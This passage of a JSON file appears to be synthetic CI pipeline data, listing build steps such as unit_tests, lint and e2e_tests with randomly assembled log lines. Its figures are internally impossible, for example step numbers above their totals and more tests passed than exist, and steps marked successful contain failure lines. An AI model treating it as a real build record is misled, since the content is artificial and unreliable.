          "[12:19:43] DEBUG: Initializing service",
          "Image pulled successfully",
          "pip: Collecting prettier",
          "GET /status - 201 (49ms)",
          "Connection established",
          "[12:19:43] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling utils/utils.go...",
          "Step 9/24: Testing",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "[12:19:43] WARN: Deprecated API usage",
          "Step 15/22: Building",
          "Step 1/25: Linting",
          "Step 16/22: Building",
          "[12:19:43] DEBUG: Connection pool: 5 active",
          "[12:19:43] DEBUG: Query executed in 50ms",
          "Using Python 3.9",
          "[12:19:43] DEBUG: Memory usage: 1330MB",
          "Step 19/16: Deploying",
          "Switched to branch 'hotfix/task-505'",
          "Completed.",
          "Compiling utils/index.js...",
          "Connecting to startup.dev:443...",
          "[12:19:43] DEBUG: Connection pool: 13 active",
          "Pulling image: alpine:latest",
          "Using Python 3.10",
          "Checking out master branch",
          "[12:19:43] INFO: Connecting to database",
          "npm install: resolved 1532 packages",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 3/22: Installing dependencies",
          "Pulling image: node:3.11",
          "Fetching submodules...",
          "Cache miss for key-9829",
          "[12:19:43] INFO: Cache refreshed",
          "Compiling lib/main.py...",
          "Waiting...",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache hit for key-4945",
          "[12:19:43] ERROR: Connection failed",
          "NODE_ENV=test",
          "[12:19:43] DEBUG: Query executed in 27ms",
          "Artifact downloaded: 27MB",
          "Compiling utils/utils.go...",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling src/app.ts...",
          "Completed.",
          "\u2713 Task completed in 3383ms",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Waiting...",
          "Layer 10/15: COPY command",
          "\u2713 Step 'setup' succeeded",
          "Step 13/22: Running migrations",
          "Cache invalidated: dependencies",
          "npm install: added 84 packages",
          "Pulling image: python:3.11",
          "pip install: Successfully installed webpack-5.5",
          "Optimizing 98 modules...",
          "Using Node.js 17.4.10",
          "pip: Downloading webpack-4.12.tar.gz",
          "Cache miss for key-6926",
          "Step 7/19: Deploying",
          "[12:19:43] DEBUG: Loading configuration",
          "Completed.",
          "NODE_ENV=development",
          "Using Node.js 18.4.0",
          "Step 19/15: Linting",
          "Optimizing 49 modules...",
          "Finished.",
          "npm install: resolved 598 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Cache invalidated: build",
          "[12:19:43] INFO: Request completed",
          "Cache saved successfully",
          "NODE_ENV=development",
          "Cache invalidated: node_modules",
          "[12:19:43] WARN: Deprecated API usage",
          "Connecting to example.com:443...",
          "Coverage: 91% statements, 86% branches",
          "Using Node.js 15.14.3",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "npm install: added 448 packages",
          "Using Python 3.11",
          "Checking out develop branch",
          "Step 20/16: Linting",
          "pip: Installing build dependencies...",
          "pip: Downloading eslint-4.9.tar.gz",
          "Creating production build...",
          "Layer 9/12: COPY command",
          "Cache miss for key-1926",
          "Cache saved successfully",
          "Optimizing 90 modules...",
          "Fetching submodules...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:20:07.659320",
        "finished_at": "2025-11-25T12:20:31.854086",
        "log_lines": [
          "=== Step: unit_tests ===",
          "[12:19:43] WARN: Deprecated API usage",
          "Step 8/24: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Bundling vendor.css",
          "Compiling utils/handler.rs...",
          "[12:19:43] DEBUG: Connection pool: 17 active",
          "Environment: production",
          "Step 5/22: Deploying",
          "Compiling src/service.java...",
          "[12:19:43] DEBUG: Loading configuration",
          "Verifying...",
          "[12:19:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "Step 8/15: Linting",
          "  PASS: unit/test_user_create.spec.js",
          "[12:19:43] INFO: Starting build process",
          "Cache saved successfully",
          "pip: Downloading prettier-2.0.tar.gz",
          "[12:19:43] INFO: Connecting to database",
          "pip install: Successfully installed prettier-4.15",
          "Step 2/16: Building",
          "[12:19:43] DEBUG: Loading configuration",
          "Done.",
          "Test Suites: 16 passed, 32 total",
          "OK",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:19:43] INFO: Request completed",
          "Step 6/15: Installing dependencies",
          "Connection established",
          "npm install: resolved 1357 packages",
          "[12:19:43] DEBUG: Loading configuration",
          "FAILED: test_db_connect",
          "Fetching submodules...",
          "Environment: staging",
          "NODE_ENV=production",
          "yarn add: Done in 15.91s",
          "Step 2/21: Running migrations",
          "Compiling components/app.ts...",
          "Compiling lib/main.py...",
          "Test Suites: 49 passed, 41 total",
          "Transforming 665 files...",
          "Completed.",
          "Compiling src/service.java...",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "Using Python 3.10",
          "Building Docker image...",
          "[12:19:43] INFO: Cache refreshed",
          "Verifying...",
          "Switched to branch 'feature/task-993'",
          "Step 5/21: Installing dependencies",
          "[12:19:43] ERROR: Connection failed",
          "TLS handshake completed",
          "NODE_ENV=production",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2713 All checks passed",
          "Step 8/17: Installing dependencies",
          "Transforming 198 files...",
          "Uploading artifact 'dist' (44 files)",
          "Step 14/24: Installing dependencies",
          "\u2713 All checks passed",
          "OK",
          "Connecting to startup.dev:443...",
          "Artifact uploaded: dist.zip (86MB)",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "pip install: Successfully installed webpack-5.13",
          "Cache hit for key-1234",
          "pip: Collecting react",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Time: 21.276s",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "Connection established",
          "Pushing to registry...",
          "Cache restored successfully (70MB)",
          "Waiting...",
          "[12:19:43] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:43] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-859'",
          "WARNING: lodash has known vulnerabilities",
          "Pushing to registry...",
          "npm install: resolved 907 packages",
          "Compiling src/service.java...",
          "Cache restored successfully (456MB)",
          "Cache invalidated: node_modules",
          "pip: Collecting express",
          "GET /health - 201 (2ms)",
          "Time: 53.812s",
          "HEAD is now at 1d705c6",
          "Optimizing 29 modules...",
          "Already up to date.",
          "[12:19:43] INFO: Request completed",
          "Processing...",
          "Ran 15 tests in 24s",
          "POST /data - 201 (123ms)",
          "Compiling src/handler.rs...",
          "\u2713 validate completed",
          "Ran 165 tests in 23s",
          "Connecting to example.com:443...",
          "Tests: 472 passed, 483 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:43] INFO: Connecting to database",
          "Tests: 430 passed, 172 total",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache invalidated: dependencies",
          "[12:19:43] INFO: Connecting to database",
          "\u2713 Task completed in 404ms",
          "Ready.",
          "Checking out develop branch",
          "Finished.",
          "Uploading artifact 'build' (15 files)",
          "Step 7/15: Building",
          "Creating production build...",
          "Minifying main.js",
          "Finished.",
          "npm notice: created a lockfile",
          "  PASS: test_user_create (28ms)",
          "Minifying app.js",
          "POST /api - 200 (470ms)",
          "  PASS: unit/test_user_create.spec.js",
          "Step 17/17: Building",
          "\u2713 All checks passed",
          "NODE_ENV=production",
          "yarn add: Done in 28.37s",
          "pip: Installing build dependencies...",
          "Step 2/23: Testing",
          "Cache saved successfully",
          "[12:19:43] ERROR: Connection failed",
          "Installing webpack@3.2.4",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] DEBUG: Loading configuration",
          "Pulling image: node:3.11",
          "Test Suites: 44 passed, 20 total",
          "Compiling lib/utils.go...",
          "Processing...",
          "[12:19:43] DEBUG: Initializing service",
          "Bundling vendor.css",
          "Compiling lib/service.java...",
          "Done.",
          "Using Node.js 16.9.4",
          "Environment: staging",
          "pip: Collecting eslint",
          "Cache invalidated: build",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "NODE_ENV=test",
          "WARNING: webpack has known vulnerabilities",
          "Loading...",
          "Installing lodash@5.15.4",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 24 passed, 42 total",
          "Creating production build...",
          "Creating production build...",
          "Step 4/24: Deploying",
          "Snapshots: 29 passed, 25 total",
          "Using Node.js 17.4.6",
          "[12:19:43] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (61MB)",
          "Connecting to startup.dev:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "Checking out master branch",
          "Layer 6/11: RUN command",
          "Step 12/20: Building",
          "Coverage: 100% statements, 98% branches",
          "\u2713 Step 'setup' succeeded",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-25T12:20:31.854086",
        "finished_at": "2025-11-25T12:20:39.919008",
        "log_lines": [
          "=== Step: lint ===",
          "Creating production build...",
          "Artifact uploaded: dist.zip (30MB)",
          "Cache hit for key-5903",
          "Creating production build...",
          "Pulling image: node:18",
          "Layer 6/8: ENV command",
          "Cache hit for key-2967",
          "POST /data - 202 (168ms)",
          "Step 9/16: Installing dependencies",
          "Cache hit for key-9317",
          "[12:19:43] INFO: Connecting to database",
          "Checking out master branch",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Compiling utils/app.ts...",
          "Artifact downloaded: 28MB",
          "Minifying app.js",
          "Image pulled successfully",
          "Artifact downloaded: 49MB",
          "Switched to branch 'hotfix/task-903'",
          "  PASS: integration/test_cache_hit.spec.js",
          "yarn add: Done in 8.57s",
          "pip: Downloading webpack-3.10.tar.gz",
          "Environment: development",
          "Cache hit for key-5399",
          "WARNING: lodash has known vulnerabilities",
          "Verifying...",
          "npm notice: created a lockfile",
          "npm install: resolved 272 packages",
          "WARNING: webpack has known vulnerabilities",
          "Test Suites: 20 passed, 6 total",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Minifying vendor.js",
          "[12:19:43] INFO: Cache refreshed",
          "[12:19:43] DEBUG: Loading configuration",
          "Using Node.js 19.4.0",
          "POST /api - 200 (454ms)",
          "Step 10/22: Deploying",
          "Creating production build...",
          "Pushing to registry...",
          "Optimizing 91 modules...",
          "Compiling utils/utils.go...",
          "Artifact uploaded: dist.zip (7MB)",
          "Connection established",
          "Step 10/24: Testing",
          "Connection established",
          "Building Docker image...",
          "Snapshots: 41 passed, 12 total",
          "pip: Collecting axios",
          "Snapshots: 41 passed, 1 total",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Loading...",
          "Step 18/19: Installing dependencies",
          "pip install: Successfully installed jest-2.3",
          "[12:19:43] INFO: Cache refreshed",
          "Loading...",
          "  PASS: test_db_connect (45ms)",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Initializing service",
          "Compiling components/app.ts...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:43] INFO: Starting build process",
          "[12:19:43] WARN: Deprecated API usage",
          "Step 20/17: Building",
          "Verifying...",
          "Finished.",
          "[12:19:43] DEBUG: Loading configuration",
          "Step 11/18: Deploying",
          "[12:19:43] WARN: Deprecated API usage",
          "Uploading artifact 'build' (36 files)",
          "Processing...",
          "Minifying app.js",
          "[12:19:43] INFO: Request completed",
          "Pushing to registry...",
          "Step 1/21: Deploying",
          "Loading...",
          "Success!",
          "pip install: Successfully installed axios-2.8",
          "Compiling src/utils.go...",
          "yarn add: Done in 15.40s",
          "Snapshots: 45 passed, 49 total",
          "pip install: Successfully installed prettier-1.8",
          "Switched to branch 'bugfix/task-560'",
          "pip: Collecting eslint",
          "Switched to branch 'hotfix/task-752'",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "Compiling lib/utils.go...",
          "npm install: added 120 packages",
          "Fetching submodules...",
          "Tests: 488 passed, 467 total",
          "Step 20/18: Running migrations",
          "Uploading artifact 'dist' (17 files)",
          "Optimizing 54 modules...",
          "Generating source maps...",
          "[12:19:43] DEBUG: Initializing service",
          "[12:19:43] INFO: Cache refreshed",
          "Processing...",
          "Exception: NullPointerException",
          "pip: Installing build dependencies...",
          "Connection established",
          "Compiling lib/service.java...",
          "Switched to branch 'feature/task-240'",
          "[12:19:43] INFO: Starting build process",
          "Compiling components/main.py...",
          "[12:19:43] DEBUG: Loading configuration",
          "Step 16/21: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "pip install: Successfully installed prettier-2.11",
          "[12:19:43] WARN: Deprecated API usage",
          "  PASS: test_user_create (289ms)",
          "Connecting to acme.corp:443...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Using Python 3.11",
          "POST /upload - 202 (351ms)",
          "TLS handshake completed",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling src/handler.rs...",
          "Compiling utils/main.py...",
          "Test Suites: 8 passed, 17 total",
          "[12:19:43] ERROR: Connection failed",
          "Compiling components/handler.rs...",
          "Fetching submodules...",
          "Minifying vendor.js",
          "[12:19:43] INFO: Processing request",
          "Completed.",
          "POST /upload - 202 (281ms)",
          "[12:19:43] ERROR: Connection failed",
          "Creating production build...",
          "Connecting to test.io:443...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "POST /data - 201 (409ms)",
          "HEAD is now at 370132f",
          "Minifying vendor.js",
          "NODE_ENV=development",
          "Artifact uploaded: dist.zip (89MB)",
          "Snapshots: 11 passed, 1 total",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Loading configuration",
          "Loading...",
          "\u2713 Step 'build' succeeded",
          "Installing eslint@1.17.2",
          "Verifying...",
          "[12:19:43] ERROR: Connection failed",
          "Step 7/25: Building",
          "[12:19:43] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Optimizing 54 modules...",
          "Completed.",
          "Snapshots: 50 passed, 21 total",
          "[12:19:43] DEBUG: Initializing service",
          "Compiling utils/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "Step 20/20: Deploying",
          "Completed.",
          "Already up to date.",
          "\u2717 build failed with exit code 82",
          "pip: Collecting express",
          "Compiling utils/app.ts...",
          "npm install: added 471 packages",
          "Compiling components/handler.rs...",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache hit for key-7883",
          "[12:19:43] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (16MB)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-25T12:20:39.919008",
        "finished_at": "2025-11-25T12:21:04.113774",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Connecting to startup.dev:443...",
          "[12:19:43] WARN: Deprecated API usage",
          "Environment: production",
          "Environment: development",
          "  PASS: e2e/test_api_health.spec.js",
          "Fetching submodules...",
          "Fetching submodules...",
          "Cache hit for key-6890",
          "Ready.",
          "[12:19:43] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (40MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 3/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "Test Suites: 47 passed, 11 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 91% statements, 77% branches",
          "WARNING: jest has known vulnerabilities",
          "[12:19:43] INFO: Processing request",
          "Compiling components/index.js...",
          "npm install: resolved 1723 packages",
          "Ready.",
          "Done.",
          "GET /health - 200 (46ms)",
          "[12:19:43] DEBUG: Query executed in 46ms",
          "[12:19:43] DEBUG: Connection pool: 12 active",
          "[12:19:43] INFO: Cache refreshed",
          "Time: 76.632s",
          "Time: 87.710s",
          "Snapshots: 15 passed, 36 total",
          "Already up to date.",
          "Step 6/24: Testing",
          "OK",
          "Switched to branch 'hotfix/task-315'",
          "Step 18/25: Linting",
          "FAILED: test_db_connect",
          "pip: Collecting webpack",
          "NODE_ENV=production",
          "WARNING: eslint has known vulnerabilities",
          "Artifact downloaded: 6MB",
          "Connection established",
          "Artifact downloaded: 37MB",
          "Finished.",
          "Artifact uploaded: build.tar.gz (49MB)",
          "GET /health - 204 (40ms)",
          "[12:19:43] DEBUG: Connection pool: 4 active",
          "[12:19:43] DEBUG: Memory usage: 143MB",
          "Compiling utils/utils.go...",
          "Cache saved successfully",
          "npm install: added 60 packages",
          "pip: Installing build dependencies...",
          "Coverage: 75% statements, 78% branches",
          "POST /api - 200 (343ms)",
          "Compiling components/index.js...",
          "Layer 6/8: ENV command",
          "Success!",
          "Finished.",
          "Step 10/16: Building",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache saved successfully",
          "  PASS: e2e/test_db_connect.spec.js",
          "Connecting to startup.dev:443...",
          "Transforming 688 files...",
          "Bundling vendor.js",
          "Connecting to cloud.services:443...",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (70MB)",
          "Coverage: 76% statements, 71% branches",
          "Already up to date.",
          "[12:19:43] DEBUG: Query executed in 2ms",
          "Ran 118 tests in 41s",
          "  PASS: test_auth_login (312ms)",
          "pip: Installing build dependencies...",
          "[12:19:43] INFO: Connecting to database",
          "OK",
          "HEAD is now at acba5df",
          "[12:19:43] DEBUG: Loading configuration",
          "Bundling vendor.css",
          "Creating production build...",
          "Compiling lib/index.js...",
          "Step 12/19: Installing dependencies",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/main.py...",
          "Compiling utils/app.ts...",
          "[12:19:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "[12:19:43] DEBUG: Query executed in 11ms",
          "FAILED: test_auth_login",
          "Tests: 178 passed, 343 total",
          "[12:19:43] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "yarn add: Done in 8.81s",
          "Optimizing 24 modules...",
          "Step 9/25: Installing dependencies",
          "\u2713 validate completed",
          "[12:19:43] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/16: Linting",
          "[12:19:43] DEBUG: Connection pool: 20 active",
          "Test Suites: 47 passed, 33 total",
          "Step 4/24: Deploying",
          "[12:19:43] DEBUG: Connection pool: 3 active",
          "Coverage: 100% statements, 92% branches",
          "Compiling lib/handler.rs...",
          "[12:19:43] DEBUG: Connection pool: 19 active",
          "Waiting...",
          "Finished.",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-481'",
          "Cache miss for key-4651",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "TLS handshake completed",
          "Building Docker image...",
          "Connection established",
          "yarn add: Done in 9.42s",
          "Coverage: 100% statements, 86% branches",
          "Cache restored successfully (225MB)",
          "npm install: added 196 packages",
          "[12:19:43] DEBUG: Connection pool: 17 active",
          "Transforming 677 files...",
          "Artifact uploaded: dist.zip (29MB)",
          "Uploading artifact 'coverage' (45 files)",
          "Coverage: 79% statements, 77% branches",
          "npm install: resolved 411 packages",
          "Completed.",
          "Building Docker image...",
          "  PASS: test_api_health (421ms)",
          "Building Docker image...",
          "Processing...",
          "Layer 3/11: ENV command",
          "Verifying...",
          "Exception: RuntimeError",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Verifying...",
          "[12:19:43] DEBUG: Connection pool: 2 active",
          "Switched to branch 'feature/task-917'",
          "Uploading artifact 'dist' (28 files)",
          "Using Python 3.9",
          "[12:19:43] INFO: Cache refreshed",
          "Connecting to startup.dev:443...",
          "[12:19:43] INFO: Cache refreshed",
          "Optimizing 11 modules...",
          "[12:19:43] INFO: Request completed",
          "Waiting...",
          "Snapshots: 9 passed, 24 total",
          "Ready.",
          "Building Docker image...",
          "Coverage: 99% statements, 80% branches",
          "Optimizing 73 modules...",
          "Waiting...",
          "[12:19:43] WARN: Deprecated API usage",
          "Ran 22 tests in 34s",
          "Bundling runtime.js",
          "Generating source maps...",
          "Waiting...",
          "FAILED: test_user_create",
          "\u2717 build failed with exit code 44",
          "yarn add: Done in 30.5s",
          "Time: 98.158s",
          "Cache miss for key-8878",
          "Installing prettier@5.0.5",
          "Cache invalidated: build",
          "HEAD is now at 3e51d58",
          "Cache hit for key-1148",
          "[12:19:43] DEBUG: Loading configuration",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:21:04.113774",
        "finished_at": "2025-11-25T12:21:12.178696",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "Step 20/15: Testing",
          "POST /upload - 200 (72ms)",
          "Uploading artifact 'coverage' (35 files)",
          "Ran 56 tests in 47s",
          "pip: Downloading react-3.20.tar.gz",
          "TLS handshake completed",
          "Completed.",
          "\u2713 Task completed in 2083ms",
          "[12:19:43] WARN: Deprecated API usage",
          "pip: Downloading prettier-1.3.tar.gz",
          "yarn add: Done in 9.19s",
          "npm notice: created a lockfile",
          "Ran 178 tests in 15s",
          "WARNING: react has known vulnerabilities",
          "Transforming 168 files...",
          "Waiting...",
          "Generating source maps...",
          "Connecting to acme.corp:443...",
          "Platform: darwin-arm64",
          "[12:19:43] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] INFO: Request completed",
          "Transforming 209 files...",
          "npm install: added 221 packages",
          "[12:19:43] DEBUG: Connection pool: 4 active",
          "Coverage: 100% statements, 91% branches",
          "TLS handshake completed",
          "[12:19:43] DEBUG: Initializing service",
          "GET /status - 204 (86ms)",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Done.",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Uploading artifact 'build' (23 files)",
          "Generating source maps...",
          "[12:19:43] WARN: Deprecated API usage",
          "\u2713 deploy completed",
          "Already up to date.",
          "Step 16/20: Testing",
          "npm notice: created a lockfile",
          "pip: Collecting express",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Uploading artifact 'dist' (30 files)",
          "Snapshots: 37 passed, 0 total",
          "Tests: 344 passed, 442 total",
          "Coverage: 79% statements, 81% branches",
          "[12:19:43] INFO: Connecting to database",
          "Cache saved successfully",
          "\u2713 Task completed in 1248ms",
          "Test Suites: 28 passed, 14 total",
          "Artifact uploaded: dist.zip (61MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "pip: Downloading express-4.1.tar.gz",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/service.java...",
          "Step 18/19: Testing",
          "Connecting to cloud.services:443...",
          "\u2717 build failed with exit code 108",
          "Cache hit for key-1196",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "pip: Downloading webpack-3.10.tar.gz",
          "Compiling components/index.js...",
          "Installing prettier@4.8.7",
          "Compiling utils/main.py...",
          "Generating source maps...",
          "[12:19:43] DEBUG: Loading configuration",
          "Compiling lib/service.java...",
          "Step 19/21: Installing dependencies",
          "[12:19:43] DEBUG: Connection pool: 9 active",
          "FAILED: test_auth_login",
          "npm install: resolved 160 packages",
          "pip install: Successfully installed axios-5.19",
          "\u2713 Step 'build' succeeded",
          "Processing...",
          "Generating source maps...",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: alpine:latest",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact downloaded: 37MB",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: build",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling lib/app.ts...",
          "pip: Downloading express-2.14.tar.gz",
          "  PASS: test_user_create (345ms)",
          "pip install: Successfully installed webpack-1.8",
          "Step 20/21: Installing dependencies",
          "Compiling components/index.js...",
          "GET /health - 200 (23ms)",
          "npm install: resolved 750 packages",
          "npm notice: package.json updated",
          "Finished.",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:43] INFO: Connecting to database",
          "Compiling lib/index.js...",
          "[12:19:43] INFO: Processing request",
          "Compiling lib/handler.rs...",
          "Cache saved successfully",
          "\u2717 build failed with exit code 83",
          "POST /upload - 202 (355ms)",
          "[12:19:43] DEBUG: Connection pool: 12 active",
          "[12:19:43] INFO: Connecting to database",
          "Checking out develop branch",
          "Verifying...",
          "Ran 114 tests in 58s",
          "Compiling lib/handler.rs...",
          "WARNING: webpack has known vulnerabilities",
          "Step 15/25: Installing dependencies",
          "Generating source maps...",
          "Completed.",
          "[12:19:43] DEBUG: Query executed in 21ms",
          "[12:19:43] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (11MB)",
          "OK",
          "Cache saved successfully",
          "[12:19:43] INFO: Starting build process",
          "Pushing to registry...",
          "Exception: RuntimeError",
          "Completed.",
          "Exception: RuntimeError",
          "Layer 2/13: COPY command",
          "[12:19:43] INFO: Processing request",
          "[12:19:43] ERROR: Connection failed",
          "Image pulled successfully",
          "pip: Downloading react-3.8.tar.gz",
          "Artifact uploaded: build.tar.gz (46MB)",
          "OK",
          "Snapshots: 21 passed, 1 total",
          "Connecting to acme.corp:443...",
          "Cache saved successfully",
          "Success!",
          "npm notice: created a lockfile",
          "[12:19:43] INFO: Request completed",
          "Finished.",
          "Compiling components/main.py...",
          "HEAD is now at fc7703d",
          "Fetching submodules...",
          "Step 15/19: Running migrations",
          "Minifying app.js",
          "Time: 4.503s",
          "[12:19:43] DEBUG: Query executed in 18ms",
          "Creating production build...",
          "Cache invalidated: build",
          "Uploading artifact 'coverage' (1 files)",
          "[12:19:43] DEBUG: Initializing service",
          "[12:19:43] INFO: Processing request",
          "Image pulled successfully",
          "[12:19:43] DEBUG: Query executed in 65ms",
          "Connection established",
          "[12:19:43] DEBUG: Initializing service",
          "Waiting...",
          "  PASS: test_auth_login (125ms)",
          "Exception: NullPointerException",
          "POST /api - 202 (174ms)",
          "  PASS: test_auth_login (477ms)",
          "Done.",
          "Compiling utils/main.py...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:21:12.178696",
        "finished_at": "2025-11-25T12:21:20.243618",
        "log_lines": [
          "=== Step: type_check ===",
          "Layer 5/13: RUN command",
          "POST /upload - 202 (454ms)",
          "Layer 8/9: ENV command",
          "npm notice: package.json updated",
          "Creating production build...",
          "Step 17/25: Testing",
          "\u2713 All checks passed",
          "[12:19:43] DEBUG: Loading configuration",
          "Verifying...",
          "POST /api - 202 (369ms)",
          "[12:19:43] INFO: Cache refreshed",
          "[12:19:43] ERROR: Connection failed",
          "Transforming 706 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 1349458",
          "Compiling utils/utils.go...",
          "Step 7/18: Building",
          "Switched to branch 'hotfix/task-993'",
          "Cache restored successfully (352MB)",
          "Step 10/18: Installing dependencies",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "Snapshots: 27 passed, 34 total",
          "[12:19:43] DEBUG: Connection pool: 15 active",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Transforming 126 files...",
          "Test Suites: 38 passed, 8 total",
          "HEAD is now at 4015483",
          "Ran 144 tests in 6s",
          "Connection established",
          "Cache invalidated: dependencies",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/20: Building",
          "\u2713 Step 'install' succeeded",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] DEBUG: Loading configuration",
          "TLS handshake completed",
          "Already up to date.",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=test",
          "pip: Downloading express-1.11.tar.gz",
          "Platform: win32-x64",
          "Loading...",
          "\u2713 test completed",
          "Connecting to example.com:443...",
          "pip install: Successfully installed jest-2.7",
          "Pulling image: alpine:18",
          "GET /api - 200 (88ms)",
          "Compiling src/app.ts...",
          "Connecting to acme.corp:443...",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (87MB)",
          "Loading...",
          "[12:19:43] WARN: Deprecated API usage",
          "Connection established",
          "Coverage: 88% statements, 93% branches",
          "[12:19:43] ERROR: Connection failed",
          "Compiling lib/service.java...",
          "[12:19:43] INFO: Processing request",
          "Ran 116 tests in 17s",
          "[12:19:43] INFO: Starting build process",
          "Environment: production",
          "Done.",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache miss for key-8406",
          "Uploading artifact 'coverage' (49 files)",
          "Ran 135 tests in 18s",
          "Completed.",
          "NODE_ENV=development",
          "Step 19/18: Running migrations",
          "OK",
          "Compiling src/utils.go...",
          "Cache miss for key-7133",
          "Installing express@5.15.2",
          "Optimizing 25 modules...",
          "[12:19:43] DEBUG: Loading configuration",
          "Generating source maps...",
          "npm install: resolved 1091 packages",
          "Compiling components/index.js...",
          "Finished.",
          "Compiling lib/index.js...",
          "[12:19:43] INFO: Starting build process",
          "  PASS: test_api_health (349ms)",
          "Cache invalidated: build",
          "[12:19:43] INFO: Connecting to database",
          "Finished.",
          "TLS handshake completed",
          "[12:19:43] ERROR: Connection failed",
          "Bundling main.js",
          "NODE_ENV=test",
          "Pulling image: node:18",
          "HEAD is now at 3659b25",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:19:43] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
